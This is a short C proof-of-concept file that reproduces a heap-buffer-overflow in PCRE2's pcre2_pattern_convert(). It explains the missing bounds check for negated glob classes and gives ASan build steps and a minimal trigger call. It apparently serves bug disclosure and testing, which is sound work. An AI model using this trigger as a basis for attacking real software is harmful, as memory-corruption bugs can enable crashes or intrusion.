/* PoC: pcre2_pattern_convert() heap-buffer-overflow.
 *
 * pcre2_pattern_convert() supports a caller-supplied output buffer: the
 * caller passes a buffer and its length in *buffptr/*bufflenptr, and the
 * function is documented to fail cleanly with PCRE2_ERROR_NOMEMORY if the
 * buffer is too small. When converting a glob pattern that contains a
 * negated character class together with PCRE2_CONVERT_GLOB_NO_WILD_SEPARATOR,
 * part of the output for the class is written straight into the caller's
 * buffer without checking the remaining space, so a buffer that is a couple
 * of code units short of what is required is overrun instead of producing
 * the documented error.
 *
 * Build (ASan):
 *   cc -fsanitize=address -g -O0 -Isrc -I<build-dir> \
 *      pocs/newbug.c <path-to-libpcre2-8.a> -o newbug
 * Run:
 *   ./newbug
 */

#define PCRE2_CODE_UNIT_WIDTH 8
#include <pcre2.h>
#include <stdlib.h>
#include <stdio.h>

int main(void)
{
PCRE2_SPTR pattern = (PCRE2_SPTR) "[!a]";
PCRE2_SIZE buflen = 7;
PCRE2_UCHAR *buffer = malloc(buflen * sizeof(PCRE2_UCHAR));
PCRE2_UCHAR *buffptr = buffer;
PCRE2_SIZE bufflen = buflen;
int rc;

rc = pcre2_pattern_convert(pattern, PCRE2_ZERO_TERMINATED,
  PCRE2_CONVERT_GLOB | PCRE2_CONVERT_GLOB_NO_WILD_SEPARATOR,
  &buffptr, &bufflen, NULL);

printf("rc=%d\n", rc);

free(buffer);
return 0;
}
